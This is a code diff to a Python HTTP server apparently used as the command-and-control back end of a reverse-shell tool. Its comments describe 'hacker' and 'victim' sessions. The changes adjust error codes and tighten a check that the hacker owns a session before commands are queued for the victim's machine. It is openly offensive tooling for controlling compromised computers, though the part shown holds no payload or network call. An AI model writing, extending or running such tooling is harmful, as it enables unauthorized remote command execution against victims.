@@ -292,7 +292,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # Check if our req_body isn't None
         if req_body is None:
-            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
+            return bad_request
 
         try:
             # Let's try to decode this fella
@@ -312,13 +312,21 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         if not self.hacking_sessions.check_session_active(session_id):
             # The victim is not even in session or it is in one, but
             # not with this hacker. So let's return an error
-            return sh.HandlerResponse(False, HTTPStatus.FORBIDDEN)
+            return sh.HandlerResponse(False, HTTPStatus.NOT_FOUND)
 
-        # Check if the hacker himself is not in the session
-        if not self.hacking_sessions.check_client_in_session(client_id):
-            # The hacker is not accessing his own session_id so let's return
-            # an error code
-            return sh.HandlerResponse(False, HTTPStatus.FORBIDDEN)
+        # check if the hacker is in a session and that he is trying to access
+        # a session he is in
+        real_session_id = self.hacking_sessions.get_session_id(client_id)
+
+        if real_session_id is None:
+            # Means if the hacker isn't even in a session
+            return sh.HandlerResponse(False, HTTPStatus.BAD_REQUEST)
+
+        elif real_session_id is not None:
+            # Now we need to check if the real_session_id provided is really the hackers
+            session = self.hacking_sessions.get_session(session_id)
+            if not session.get("hacker_id") == client_id:
+                return sh.HandlerResponse(False, HTTPStatus.FORBIDDEN)
 
         # If we are in session with the victim and satisfy all the other requirements
         # we can proceed by inserting the command in the session comm.
